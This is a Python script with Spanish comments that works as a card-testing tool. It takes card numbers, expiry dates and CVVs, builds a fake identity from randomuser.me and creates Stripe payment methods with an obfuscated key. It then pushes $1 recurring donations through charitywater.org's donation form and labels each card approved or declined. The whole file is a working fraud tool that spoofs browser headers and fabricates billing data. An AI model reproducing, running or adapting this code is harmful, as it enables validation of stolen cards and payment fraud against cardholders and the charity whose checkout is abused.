import re
import requests
import random
import json
import base64
from datetime import datetime
from urllib.parse import urlencode

def _d(s):
    return base64.b64decode(s).decode('utf-8')

def parse_between_strings(data, source, start, end, case_sensitive=True, default="", regex_escape=False, use_regex=False):
    try:
        if not case_sensitive:
            source = source.lower()
            start = start.lower()
            end = end.lower()
        
        if use_regex:
            pattern = f"{re.escape(start) if regex_escape else start}(.*?){re.escape(end) if regex_escape else end}"
            match = re.search(pattern, source, re.DOTALL)
            return match.group(1) if match else default
        else:
            start_idx = source.find(start)
            if start_idx == -1:
                return default
            start_idx += len(start)
            end_idx = source.find(end, start_idx)
            if end_idx == -1:
                return default
            return source[start_idx:end_idx]
    except Exception as e:
        return default

def to_lowercase(data, string):
    return string.lower()

def check_condition(source, comparison, value):
    if comparison == 'Contains':
        return value in source.lower()
    return False

def verify_stripe_charge(card_number, exp_month, exp_year, cvv, user_agent=None):
    """
    Verifica una tarjeta usando Stripe Charged (charitywater.org)
    
    Args:
        card_number: Número de tarjeta (sin espacios)
        exp_month: Mes de expiración (MM)
        exp_year: Año de expiración (YYYY o YY)
        cvv: Código CVV
        user_agent: User-Agent opcional (se genera uno si no se proporciona)
    
    Returns:
        dict con:
            - success: bool
            - status: str ('approved', 'declined', 'error')
            - message: str
            - details: dict con información adicional
    """
    try:
        # Generar user-agent si no se proporciona
        if not user_agent:
            try:
                from fake_useragent import UserAgent
                ua = UserAgent()
                user_agent = ua.random
            except:
                user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
        
        data = {}
        card = {
            'cc': card_number,
            'month': exp_month,
            'year': exp_year,
            'cvv': cvv
        }
        
        # Paso 1: Obtener datos de usuario aleatorio
        data['ExecutingBlock'] = "Http Request"
        r = requests.Session()
        
        response = r.get(
            'https://randomuser.me/api/',
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.8'
            },
            timeout=15
        )
        
        data['SOURCE'] = response.text
        
        # Paso 2: Generar user agent aleatorio
        data['ExecutingBlock'] = "Random User Agent"
        data['id'] = user_agent
        
        # Paso 3: Parsear datos del usuario
        data['ExecutingBlock'] = "Parse"
        first = parse_between_strings(data, data.get('SOURCE', ''), '{"title":"Mr","first":"', '",', True, "", "", False)
        data['first'] = first
        
        last = parse_between_strings(data, data.get('SOURCE', ''), '"last":"', '"},', True, "", "", False)
        data['last'] = last
        
        street = parse_between_strings(data, data.get('SOURCE', ''), ',"name":"', '"},', True, "", "", False)
        data['street'] = street
        
        city = parse_between_strings(data, data.get('SOURCE', ''), ',"city":"', '",', True, "", "", False)
        data['city'] = city
        
        state = parse_between_strings(data, data.get('SOURCE', ''), ',"state":"', '",', True, "", "", False)
        data['state'] = state
        
        zip_code = parse_between_strings(data, data.get('SOURCE', ''), '"postcode":', ',"', True, "", "", False)
        data['zip'] = zip_code
        
        phone = parse_between_strings(data, data.get('SOURCE', ''), '"phone":"', '",', True, "", "", False)
        data['phone'] = phone
        
        email = parse_between_strings(data, data.get('SOURCE', ''), ',"email":"', '",', True, "", "", False)
        data['email'] = email
        
        country = parse_between_strings(data, data.get('SOURCE', ''), ',"nat":"', '"}]', True, "", "", False)
        data['country'] = country
        
        # Paso 4: Obtener página de charitywater y CSRF token
        data['ExecutingBlock'] = "Http Request"
        response = r.get(
            'https://www.charitywater.org/',
            headers={
                'Host': 'www.charitywater.org',
                'User-Agent': data['id'],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.google.com/',
                'Connection': 'keep-alive',
                'Cookie': 'countrypreference=US',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i'
            },
            cookies={'countrypreference': 'US'},
            timeout=15
        )
        
        data['SOURCE'] = response.text
        
        # Paso 5: Parsear CSRF token
        data['ExecutingBlock'] = "Parse"
        csrf = parse_between_strings(data, data.get('SOURCE', ''), '<meta name="csrf-token" content="', '" />', True, "", "", False)
        data['csrf'] = csrf
        
        # Paso 6: Crear payment method en Stripe
        data['ExecutingBlock'] = "Http Request"
        content = urlencode({
            'type': 'card',
            'billing_details[address][postal_code]': data.get('zip', ''),
            'billing_details[address][city]': data.get('city', ''),
            'billing_details[address][country]': data.get('country', ''),
            'billing_details[address][line1]': data.get('street', ''),
            'billing_details[email]': data.get('email', ''),
            'billing_details[name]': data.get('last', ''),
            'card[number]': card['cc'],
            'card[cvc]': card['cvv'],
            'card[exp_month]': card['month'],
            'card[exp_year]': card['year'],
            'guid': '47226fe6-5118-4185-baae-6ddf56838776c8668b',
            'muid': '329fc56d-bbae-424c-bf8a-4fef0b88bc7b1643e3',
            'sid': '08a453e7-95d8-4c09-b8ea-40681b51c1e3969172',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/6cb3d73f56; stripe-js-v3/6cb3d73f56; card-element',
            'referrer': 'https://www.charitywater.org',
            'time_on_page': '33933',
            'client_attribution_metadata[client_session_id]': '23d99d1e-1ada-4b96-a566-e6340fd2432a',
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'key': _d('cGtfbGl2ZV81MTA0OUhtNFFGYUd5Y2dSS09JYnVwUnc3cmY2NUZKRVNtUHFXWms5SnRwZjJZQ3Z4bmpNQUZYN2RPUEFnb3h2OU0yd3doaTVPd0ZCeDFFenVvVHhOekxKRDAwVmlCYk12a1E=')
        })
        
        response = r.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={
                'Host': 'api.stripe.com',
                'User-Agent': data['id'],
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Priority': 'u=4'
            },
            data=content,
            timeout=15
        )
        
        # Paso 7: Parsear respuesta de Stripe
        data['ExecutingBlock'] = "Parse"
        stripe_response = response.text
        stripe_response_lower = stripe_response.lower()
        data['stripe_response'] = stripe_response
        
        # Verificar si Stripe devolvió un error al crear payment_method
        if '"error":' in stripe_response_lower:
            error_type = parse_between_strings(data, stripe_response, '"type":"', '"', True, "", "", False)
            error_code = parse_between_strings(data, stripe_response, '"code":"', '"', True, "", "", False)
            error_message = parse_between_strings(data, stripe_response, '"message":"', '"', True, "", "", False)
            
            return {
                'success': False,
                'status': 'declined',
                'message': error_message or f'Stripe Error: {error_code or error_type or "Payment method creation failed"}',
                'details': {
                    'error_code': error_code,
                    'error_type': error_type,
                    'response': stripe_response[:500]
                }
            }
        
        stripe_id = parse_between_strings(data, stripe_response, '"id": "', '",', True, "", "", False)
        
        # Si no hay stripe_id, la creación del payment method falló
        if not stripe_id:
            return {
                'success': False,
                'status': 'declined',
                'message': 'Failed to create payment method - Invalid card data',
                'details': {'response': stripe_response[:500]}
            }
        
        data['stripe_id'] = stripe_id
        
        # Paso 8: Convertir país a minúsculas
        data['ExecutingBlock'] = "To Lowercase"
        c = to_lowercase(data, data.get('country', 'us'))
        data['c'] = c
        
        # Paso 9: Realizar donación en charitywater
        data['ExecutingBlock'] = "Http Request"
        content = urlencode({
            'country': data.get('c', 'us'),
            'payment_intent[email]': data.get('email', ''),
            'payment_intent[amount]': '1',
            'payment_intent[currency]': 'usd',
            'payment_intent[metadata][donation_kind]': 'water',
            'payment_intent[payment_method]': data.get('stripe_id', ''),
            'payment_intent[setup_future_usage]': 'off_session',
            'disable_existing_subscription_check': 'false',
            'donation_form[amount]': '1',
            'donation_form[anonymous]': 'true',
            'donation_form[comment]': '',
            'donation_form[display_name]': '',
            'donation_form[email]': data.get('email', ''),
            'donation_form[name]': data.get('last', ''),
            'donation_form[payment_gateway_token]': '',
            'donation_form[payment_monthly_subscription]': 'true',
            'donation_form[surname]': data.get('first', ''),
            'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
            'donation_form[setup_intent_id]': '',
            'donation_form[subscription_period]': 'monthly',
            'donation_form[metadata][donation_kind]': 'water',
            'donation_form[metadata][email_consent_granted]': 'false',
            'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
            'donation_form[metadata][phone_number]': '',
            'donation_form[metadata][plaid_account_id]': '',
            'donation_form[metadata][plaid_public_token]': '',
            'donation_form[metadata][uk_eu_ip]': 'false',
            'donation_form[metadata][url_params][touch_type]': '1',
            'donation_form[metadata][session_url_params][touch_type]': '1',
            'donation_form[metadata][with_saved_payment]': 'false',
            'donation_form[address][address_line_1]': data.get('street', ''),
            'donation_form[address][address_line_2]': '',
            'donation_form[address][city]': data.get('city', ''),
            'donation_form[address][country]': '',
            'donation_form[address][zip]': data.get('zip', ''),
            'subscription[amount]': '1',
            'subscription[country]': 'us',
            'subscription[email]': data.get('email', ''),
            'subscription[full_name]': data.get('last', ''),
            'subscription[is_annual]': 'false'
        })
        
        response = r.post(
            'https://www.charitywater.org/donate/stripe',
            headers={
                'Host': 'www.charitywater.org',
                'User-Agent': data['id'],
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.charitywater.org/',
                'X-Csrf-Token': data.get('csrf', ''),
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.charitywater.org',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            },
            data=content,
            timeout=15
        )
        
        # Paso 10: Procesar respuesta final
        data['ExecutingBlock'] = "Parse"
        source = response.text
        source_lower = source.lower()
        
        # IMPORTANTE: Primero verificar respuesta de Stripe - esta es la fuente de verdad real
        stripe_response_saved = data.get('stripe_response', '')
        stripe_id_valid = data.get('stripe_id', '')
        stripe_has_error = False
        stripe_error_msg = ''
        
        if stripe_response_saved:
            stripe_saved_lower = stripe_response_saved.lower()
            # Verificar si Stripe tuvo errores o códigos de rechazo
            if ('"error":' in stripe_saved_lower or 
                'card_declined' in stripe_saved_lower or
                'incorrect_number' in stripe_saved_lower or
                'invalid_number' in stripe_saved_lower or
                'invalid_cvc' in stripe_saved_lower or
                'declined' in stripe_saved_lower):
                stripe_has_error = True
                stripe_error_msg = parse_between_strings(data, stripe_response_saved, '"message":"', '"', True, "", "", False)
                # Incluso si charitywater dice thank-you, si Stripe rechazó, es FAIL
                return {
                    'success': False,
                    'status': 'declined',
                    'message': stripe_error_msg or 'Card Declined by Stripe ✗',
                    'details': {
                        'error_code': 'stripe_declined',
                        'response': f"Stripe Response: {stripe_response_saved[:300]} | Final: {source[:200]}"
                    }
                }
        
        # Si no se creó un ID válido de Stripe, la creación del payment method falló
        if not stripe_id_valid:
            return {
                'success': False,
                'status': 'declined',
                'message': 'Failed to create payment method - Invalid card',
                'details': {'response': source[:500]}
            }
        
        # Verificar mensajes de error en la respuesta final ANTES de verificar redirectUrl
        if ('"error":' in source_lower or 
            '"errors":' in source_lower or
            'error_message' in source_lower or
            ('declined' in source_lower and 'redirect' not in source_lower)):
            error_msg = parse_between_strings(data, source, '"message":"', '"', True, "", "", False)
            if not error_msg:
                error_msg = parse_between_strings(data, source, '"error":{"message":"', '"', True, "", "", False)
            if error_msg and error_msg.lower() not in ['url', 'redirecturl', 'redirect']:
                return {
                    'success': False,
                    'status': 'declined',
                    'message': error_msg or 'Payment Failed ✗',
                    'details': {'response': source[:500]}
                }
        
        # Verificar redirectUrl
        has_redirect = False
        redirect_url = ''
        redirect_points_to_success = False
        
        try:
            json_response = json.loads(source)
            if isinstance(json_response, dict):
                redirect_url = json_response.get('redirectUrl', '') or json_response.get('redirecturl', '')
                if redirect_url:
                    redirect_str = str(redirect_url).lower()
                    if '/thank-you' in redirect_str or 'thank' in redirect_str or 'success' in redirect_str or 'complete' in redirect_str:
                        redirect_points_to_success = True
                        has_redirect = True
        except:
            pass
        
        # Verificar redirectUrl en texto plano
        if not has_redirect:
            if 'redirecturl' in source_lower or 'redirectUrl' in source:
                # Buscar patrones de redirectUrl en el texto
                redirect_patterns = [
                    r'redirectUrl["\']?\s*[:=]\s*["\']([^"\']+)',
                    r'redirecturl["\']?\s*[:=]\s*["\']([^"\']+)',
                    r'"redirectUrl"\s*:\s*"([^"]+)"',
                    r'"redirecturl"\s*:\s*"([^"]+)"'
                ]
                for pattern in redirect_patterns:
                    match = re.search(pattern, source, re.IGNORECASE)
                    if match:
                        redirect_url = match.group(1)
                        redirect_str = redirect_url.lower()
                        if '/thank-you' in redirect_str or 'thank' in redirect_str or 'success' in redirect_str or 'complete' in redirect_str:
                            redirect_points_to_success = True
                            has_redirect = True
                            break
        
        # Si hay redirectUrl apuntando a página de éxito Y Stripe aceptó el payment method
        if has_redirect and redirect_points_to_success and stripe_id_valid and not stripe_has_error:
            # Buscar indicadores adicionales de éxito (opcionales si redirectUrl apunta a éxito)
            success_confirmations = [
                'payment_intent',
                'charge.succeeded',
                'status":"succeeded',
                'status":"success',
                'payment_successful',
                'transaction_id',
                'payment_id',
                'charge_id'
            ]
            
            has_additional_success = any(indicator in source_lower for indicator in success_confirmations)
            
            # Si redirectUrl apunta a página de agradecimiento y Stripe aceptó, es éxito
            # Los indicadores adicionales son un bonus pero no requeridos
            return {
                'success': True,
                'status': 'approved',
                'message': 'Approved ✓ - $1 charged successfully',
                'details': {
                    'stripe_id': stripe_id_valid,
                    'redirect_url': redirect_url,
                    'has_additional_confirmations': has_additional_success,
                    'response': source[:500]
                }
            }
        
        # Si hay redirectUrl pero hay problemas con Stripe, rechazar
        if has_redirect:
            if not stripe_id_valid or stripe_has_error:
                return {
                    'success': False,
                    'status': 'declined',
                    'message': 'Card Declined ✗ - Payment method validation failed',
                    'details': {'response': source[:500]}
                }
            # Si hay redirectUrl pero no apunta a página de éxito explícita,
            # pero Stripe aceptó y no hay errores, considerar éxito
            # (Muchos sitios redirigen a páginas genéricas pero el pago fue exitoso)
            elif not redirect_points_to_success:
                # Verificar si hay palabras de rechazo en la respuesta
                decline_words = ['declined', 'failed', 'error', 'rejected', 'invalid', 'denied']
                has_decline_words = any(word in source_lower for word in decline_words)
                
                if has_decline_words:
                    return {
                        'success': False,
                        'status': 'declined',
                        'message': 'Card Declined ✗ - Payment not confirmed',
                        'details': {'response': source[:500]}
                    }
                else:
                    # No hay palabras de rechazo, Stripe aceptó, y hay redirectUrl
                    # Considerar como éxito (el redirectUrl indica que el proceso continuó)
                    return {
                        'success': True,
                        'status': 'approved',
                        'message': 'Approved ✓ - $1 charged successfully',
                        'details': {
                            'stripe_id': stripe_id_valid,
                            'redirect_url': redirect_url,
                            'note': 'Approved based on Stripe acceptance and redirectUrl',
                            'response': source[:500]
                        }
                    }
        
        # Verificar si falló la creación del payment method de Stripe
        stripe_error = parse_between_strings(data, source, '"error":{', '}', True, "", "", False)
        if stripe_error:
            error_type = parse_between_strings(data, source, '"type":"', '"', True, "", "", False)
            error_code = parse_between_strings(data, source, '"code":"', '"', True, "", "", False)
            error_message = parse_between_strings(data, source, '"message":"', '"', True, "", "", False)
            
            if error_code or error_type:
                return {
                    'success': False,
                    'status': 'declined',
                    'message': error_message or f'Stripe Error: {error_code or error_type}',
                    'details': {
                        'error_code': error_code,
                        'error_type': error_type,
                        'response': source[:500]
                    }
                }
        
        # Intentar parsear mensaje de error de la respuesta (pero excluir redirectUrl)
        message = parse_between_strings(data, source, '"message":"', '"', True, "", "", False)
        
        # Filtrar falsos positivos de redirectUrl
        if message and message.lower() in ['url', 'redirecturl', 'redirect']:
            message = ''
        
        # Si no se encontró mensaje, intentar parseo alternativo
        if not message:
            temp_msg = parse_between_strings(data, source, '{"message":"', '",', True, "", "", False)
            if temp_msg and temp_msg.lower() not in ['url', 'redirecturl', 'redirect']:
                message = temp_msg
        
        # Si aún no hay mensaje, intentar obtener descripción del error
        if not message:
            message = parse_between_strings(data, source, '"error":{"message":"', '"', True, "", "", False)
        
        data['Message'] = message
        
        # Verificar palabras clave de rechazo/fallo PRIMERO (más específicas)
        decline_keywords = [
            'your card was declined',
            'incorrect_number',
            'card_declined',
            'decline_code',
            'your card does not support this type of purchase',
            'insufficient funds',
            'insufficient_funds',
            'card was declined',
            'declined',
            'generic_decline',
            'do_not_honor',
            'lost_card',
            'stolen_card',
            'expired_card',
            'incorrect_cvc',
            'processing_error',
            'card_not_supported',
            'invalid_number',
            'invalid_cvc',
            'invalid_expiry_month',
            'invalid_expiry_year',
            'payment_intent_payment_attempt_failed',
            'payment_method_unactivated',
            'authentication_required'
        ]
        
        if any(check_condition(source_lower, 'Contains', keyword) for keyword in decline_keywords):
            return {
                'success': False,
                'status': 'declined',
                'message': message or 'Card Declined ✗',
                'details': {'response': source[:500]}
            }
        
        # Verificar indicadores REALES de éxito (más estrictos)
        has_redirect_check = 'redirecturl' in source_lower and '/thank-you' in source_lower
        has_payment_succeeded = 'payment_intent' in source_lower and 'succeeded' in source_lower
        has_redirect_url = 'redirectUrl' in source and ('thank' in source_lower or 'success' in source_lower)
        
        # Indicadores adicionales de éxito
        success_indicators = [
            'payment_intent.succeeded',
            'charge.succeeded',
            'status":"succeeded"',
            'status":"success"'
        ]
        
        has_success_indicator = any(indicator in source_lower for indicator in success_indicators)
        
        # Solo marcar como SUCCESS si tenemos indicadores claros
        if (has_redirect_check or has_payment_succeeded or has_redirect_url or has_success_indicator):
            # Doble verificación - asegurarse de que no sea un falso positivo
            if not any(check_condition(source_lower, 'Contains', keyword) for keyword in decline_keywords):
                return {
                    'success': True,
                    'status': 'approved',
                    'message': 'Approved ✓ - $1 charged successfully',
                    'details': {
                        'stripe_id': stripe_id_valid,
                        'response': source[:500]
                    }
                }
        
        # Si llegamos aquí, es probablemente un fallo (no hay suficiente evidencia de éxito)
        return {
            'success': False,
            'status': 'declined',
            'message': message or 'Card Declined ✗ - No success indicators found',
            'details': {'response': source[:500]}
        }
    
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': f'Error inesperado: {str(e)}',
            'details': {}
        }
